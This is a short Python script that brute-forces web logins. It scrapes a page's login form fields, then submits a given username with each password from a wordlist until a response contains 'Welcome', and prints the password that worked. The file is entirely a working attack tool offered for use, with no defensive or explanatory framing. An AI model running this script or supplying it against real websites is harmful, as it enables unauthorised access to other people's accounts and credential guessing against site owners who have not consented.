import sys,requests
from colorama import Back,Fore
from bs4 import BeautifulSoup


def extractForm(url):

    login_dict={}
    res = requests.get(url)
    soup = BeautifulSoup(res.content,'html.parser')
    forms = soup.find_all('form')
    
    
    for form in forms:
        for input in form.find_all('input'):
                       
            input_name=input.get('name')
            input_type=input.get('type')
            input_value=input.get('value')
            if('user' in input_name and input_type=='text'):
                login_dict[input_name]=''
            if('pass' in input_name and (input_type=='text' or input_type=='password')):
                login_dict[input_name]=''
            if(input_type=='submit'):
                login_dict[input_name]=input_value
            
            #print("Input name {} -- Type {}".format(input_name,input_type))        
    
    return login_dict


def bruteLogin(url,user,passWordList):

    data = extractForm(url)
    counter=1

    if data == {}:
        print(Back.YELLOW+Fore.BLACK+"[-]- Couldn't found Login Form - [-]"+Back.RESET+Fore.RESET)
    else:
        key_list = list(data)
        
        with open(passWordList,'r')as wordlist:
            for password in wordlist:

                print("(-) Attempt [{}] -- Password [{}]".format(counter,password.strip()))
                counter+=1
                data[key_list[0]]=user
                data[key_list[1]]=password.strip()
                res = requests.post(url,data=data)
                if('Welcome' in res.text):
                    soup = BeautifulSoup(res.content,'html.parser')
                    print(Back.WHITE+Fore.BLACK+"[+]-Login successfull-[+]"+Back.RESET+Fore.RESET)
                    print(Back.WHITE+Fore.BLACK+"Password:"+Back.RESET+Fore.RESET+" {}".format(password))
                    print(Back.WHITE+Fore.BLACK+"{}".format(soup.find('h1'))+Back.RESET+Fore.RESET)
                    exit(0)

def printLogin():
    bruteLogin(sys.argv[1],sys.argv[2],sys.argv[3])


def initial():
    if(len(sys.argv) not in range (2,4+1)):
        print("[+]-Usage--> python <program> <url> <user> <password wordlist>")
    
    printLogin()

if __name__ == '__main__':
    initial()